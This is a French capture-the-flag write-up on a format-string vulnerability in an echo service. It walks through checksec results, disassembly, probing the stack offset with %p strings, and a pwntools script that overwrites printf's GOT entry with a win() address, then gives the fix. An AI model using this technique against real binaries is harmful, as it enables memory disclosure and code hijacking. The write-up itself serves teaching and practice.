# Talking Mirror : Exploitation de Format String et Détournement de GOT

## 1. Audit Tactique

Le challenge **Talking Mirror** semble être un simple service d'écho ("miroir"). Cependant, une analyse rigoureuse des entrées utilisateur révèle une primitive de lecture/écriture arbitraire.

### Analyse de Sécurité :
```bash
$ checksec mirror
[*] 'mirror'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO  <-- VULNÉRABLE AU GOT OVERWRITE
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE         <-- ADRESSES STATIQUES
```

**Analyse de l'expert :**
Le **Partial RELRO** est une opportunité critique : la `Global Offset Table` (GOT) est réinscriptible. L'absence de **PIE** facilite la localisation des fonctions PLT. Le **NX** est actif, donc pas d'exécution directe de shellcode sur la pile.

---

## 2. Détection de la Primitive Vulnérable

En désassemblant le binaire avec `gdb-pwndbg`, on examine la boucle principale :

```nasm
<main+45>:
  lea    rax, [rbp-0x40]    ; rax = buffer sur la pile
  mov    rdi, rax           ; rdi = buffer
  mov    eax, 0
  call   gets@plt           ; Récupère l'entrée (Potentiel BoF, mais ignoré ici)
  ...
  mov    rax, [rbp-0x40]
  mov    rdi, rax           ; rdi = notre entrée
  mov    eax, 0
  call   printf@plt         ; VULNÉRABILITÉ : printf(buffer) au lieu de printf("%s", buffer)
```

### Le Code C Coupable :
```c
char buffer[64];
printf("Enter message: ");
gets(buffer);
printf(buffer); // <-- FORMAT STRING VULNERABILITY
```

---

## 3. Stratégie d'Exploitation : "The Mirror Strike"

L'expertise consiste à utiliser les spécificateurs de format (`%p`, `%n`, `%s`) pour manipuler la mémoire du processus.

### Phase 1 : Calcul de l'Offset
Nous devons savoir où se trouve notre buffer sur la pile par rapport aux arguments de `printf`.
Commandes GDB :
```bash
pwndbg> r
Enter message: AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p
AAAAAAAA|0x7fffffffd4c0|0x7ffff7faf4c0|...|0x4141414141414141
```
On repère nos `A` (0x41) au **6ème** argument. L'offset est donc de **6**.

### Phase 2 : GOT Hijacking
Puisque le RELRO est partiel, nous allons écraser l'adresse d'une fonction dans la GOT (par exemple `printf` ou `puts`) par l'adresse de la fonction `win()` (si elle existe) ou par un `one_gadget` / `system`.

**Calcul de l'adresse de la GOT :**
```bash
$ readelf -r mirror | grep printf
000000601020  000600000007 R_X86_64_JUMP_SLOT  0000000000400560 printf@GLIBC_2.2.5 + 0
```

### Phase 3 : Payload de l'Expert
Nous utilisons l'outil `fmtstr_payload` de `pwntools` pour automatiser l'écriture.

```python
from pwn import *

# Paramètres
context.arch = 'amd64'
target = ELF('./mirror')
io = remote('pwn.challenge.org', 1337)

# On veut que printf@GOT pointe vers win()
win_addr = 0x400626
printf_got = target.got['printf']

# 6 est l'offset trouvé précédemment
payload = fmtstr_payload(6, {printf_got: win_addr})

io.sendline(payload)
io.interactive()
```

---

## 4. Impact et Remédiation
Cette vulnérabilité permet à un attaquant de lire n'importe quelle adresse mémoire (leak de flag, leak de Libc) et d'écrire n'importe où. Pour corriger cela, il faut impérativement utiliser une chaîne de format statique : `printf("%s", buffer);`.

**Auteur : LWa7ch - Cybersecurity Engineer**
